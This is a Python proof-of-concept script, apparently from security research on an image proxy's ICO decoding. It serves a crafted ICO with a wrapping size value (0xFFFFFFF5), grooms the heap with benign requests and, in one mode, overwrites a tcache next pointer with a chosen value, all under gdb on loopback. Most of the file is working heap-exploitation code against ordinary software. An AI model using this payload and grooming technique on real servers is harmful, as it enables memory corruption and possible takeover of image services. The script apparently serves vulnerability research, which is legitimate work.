#!/usr/bin/env python3
"""Groomed-heap variant of the live ICO chosen-byte readback (W5).

Usage: ico_gdb_groom.py BINARY LIBDIR TAG PRELOAD_COUNT REQUEST_PATH [TIMEOUT] [GDB_WAIT] [BODY_MODE]

BODY_MODE=pattern (default) writes 32 repeating 5a5b5c5d bytes, matching W4.
BODY_MODE=ptr writes 64 bytes that preserve the following chunk's size field
(0x35) and set its tcache next pointer to a chosen 0x4141414141414141 value,
to test whether the spill can control a live allocator pointer.

Serves a benign favicon ICO and the crafted ICO on 127.0.0.1:18081, launches
BINARY under gdb on 127.0.0.1:18080, sends PRELOAD_COUNT benign GETs in the
*same* process before one hostile GET, and dumps the malloc neighbourhood at
the wrapped-size read_full call. Both endpoints bind 127.0.0.1 only.
"""
import http.client
import http.server
import os
import socket
import struct
import subprocess
import sys
import tempfile
import threading
import time

SRC_HOST, SRC_PORT = "127.0.0.1", 18081
PROXY_HOST, PROXY_PORT = "127.0.0.1", 18080
HERE = os.path.dirname(os.path.abspath(__file__))


def hostile_ico(body_mode):
    header = b"\x00\x00\x01\x00\x01\x00"
    entry = struct.pack("<BBBBHHII", 1, 1, 0, 0, 1, 32, 0xFFFFFFF5, 22)
    if body_mode == "ptr":
        body = bytearray(64)
        body[0:10] = bytes([0x5A, 0x5B, 0x5C, 0x5D] * 2) + bytes([0x5A, 0x5B])
        body[10:18] = struct.pack("<Q", 0x35)                 # victim size
        body[18:26] = struct.pack("<Q", 0x4141414141414141)   # tcache next
        body[26:64] = bytes([0x5A, 0x5B, 0x5C, 0x5D] * 9) + bytes([0x5A])
        body = bytes(body)
    else:
        body = bytes([0x5A, 0x5B, 0x5C, 0x5D] * 8)
    return header + entry + body


with open(os.path.join(HERE, "ico_benign.ico"), "rb") as _f:
    BENIGN_ICO = _f.read()

GDB_BODY = """set pagination off
set confirm off
set print pretty on
set breakpoint pending on
handle SIGPIPE nostop noprint pass
set environment IMGPROXY_BIND {bind}
set environment IMGPROXY_BASE_URL http://{src}:{srcport}/
set environment IMGPROXY_WORKERS 1
set environment IMGPROXY_CONCURRENCY 1
set environment IMGPROXY_LOG_LEVEL error
set environment IMGPROXY_ALLOW_LOOPBACK_SOURCE_ADDRESSES true
set environment LD_LIBRARY_PATH {libdir}
break vips_foreign_load_read_full if $rdx == 0xfffffff5
run
printf "GDB_HIT read_full rdi(source)=%p rsi(buf)=%p rdx(len)=%p\\n", $rdi, $rsi, $rdx
set $dst = $rsi
set $base = $dst - 14
printf "GDB base(data)=%p actual_data=%p\\n", $base, $dst
printf "GDB_PRE 12x8 at base-16:\\n"
x/12gx $base-16
finish
printf "GDB_POST 12x8 at base-16:\\n"
x/12gx $base-16
printf "GDB_POST_BYTES 96 at actual_data:\\n"
x/96bx $dst
printf "GDB_BT\\n"
bt 4
printf "GDB_MALLOCS\\n"
break malloc if $rdi <= 0x28
continue
printf "GDB_MALLOC_HIT thread=%d size=%p\\n", $_thread, $rdi
finish
printf "GDB_MALLOC_RET %p\\n", $rax
continue
printf "GDB_MALLOC_HIT2 thread=%d size=%p\\n", $_thread, $rdi
finish
printf "GDB_MALLOC_RET2 %p\\n", $rax
quit
"""


class Source(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        body = BENIGN_ICO if self.path == "/benign.ico" else HOSTILE_ICO
        self.send_response(200)
        self.send_header("Content-Type", "image/x-icon")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *args):
        pass


def wait_port(host, port, seconds=20.0):
    end = time.monotonic() + seconds
    while time.monotonic() < end:
        try:
            with socket.create_connection((host, port), 0.2):
                return True
        except OSError:
            time.sleep(0.1)
    return False


def get(path, timeout):
    conn = http.client.HTTPConnection(PROXY_HOST, PROXY_PORT, timeout=timeout)
    try:
        conn.request("GET", "/insecure/" + path, headers={"Host": PROXY_HOST})
        resp = conn.getresponse()
        return resp.status, resp.read(300).decode("utf-8", "replace")
    finally:
        conn.close()


def main():
    binary, libdir, tag, preload, request_path = sys.argv[1:6]
    preload = int(preload)
    timeout = float(sys.argv[6]) if len(sys.argv) > 6 else 10.0
    gdb_wait = float(sys.argv[7]) if len(sys.argv) > 7 else 45.0
    body_mode = sys.argv[8] if len(sys.argv) > 8 else "pattern"
    global HOSTILE_ICO
    HOSTILE_ICO = hostile_ico(body_mode)

    fd, cmdpath = tempfile.mkstemp(prefix=f"ico-groom-{tag}-", suffix=".cmd")
    with os.fdopen(fd, "w") as f:
        f.write(GDB_BODY.format(
            bind=f"{PROXY_HOST}:{PROXY_PORT}", src=SRC_HOST,
            srcport=SRC_PORT, libdir=os.path.abspath(libdir)))

    logpath = os.path.join(HERE, f"http-ico-{tag}.log")
    srv = http.server.ThreadingHTTPServer((SRC_HOST, SRC_PORT), Source)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    gdb = subprocess.Popen(
        ["gdb", "-batch", "-x", cmdpath, binary],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
    )
    results = []
    try:
        if not wait_port(PROXY_HOST, PROXY_PORT):
            print(f"ICO_GROOM tag={tag} PROXY_LISTEN=FAIL", flush=True)
            return 2
        for i in range(preload):
            try:
                st, body = get("rs:fill:16:16/plain/benign.ico", timeout)
                results.append(f"benign[{i}]={st}:{body[:60]!r}")
            except Exception as exc:
                results.append(f"benign[{i}]={type(exc).__name__}:{exc}")
        try:
            st, body = get(request_path, timeout)
            results.append(f"hostile={st}:{body[:120]!r}")
        except Exception as exc:
            results.append(f"hostile={type(exc).__name__}:{exc}")
        print(f"ICO_GROOM tag={tag} mode={body_mode} preload={preload} " +
              " ".join(results), flush=True)
    finally:
        try:
            out, _ = gdb.communicate(timeout=gdb_wait)
        except subprocess.TimeoutExpired:
            gdb.kill()
            out, _ = gdb.communicate()
        with open(logpath, "w") as f:
            f.write(f"CLIENT mode={body_mode} preload={preload} " +
                    " ".join(results) + "\n")
            f.write("=== GDB OUTPUT ===\n")
            f.write(out)
        for line in out.splitlines():
            if line.startswith(("GDB_HIT", "GDB base", "GDB_PRE", "GDB_POST",
                                "0x7fff", "GDB_BT", "GDB_MALLOC", "#0 ",
                                "Breakpoint 1")):
                print(f"ICO_GROOM_LOG {line[:400]}", flush=True)
        srv.shutdown()
        srv.server_close()
        os.unlink(cmdpath)
    return 0


if __name__ == "__main__":
    sys.exit(main())
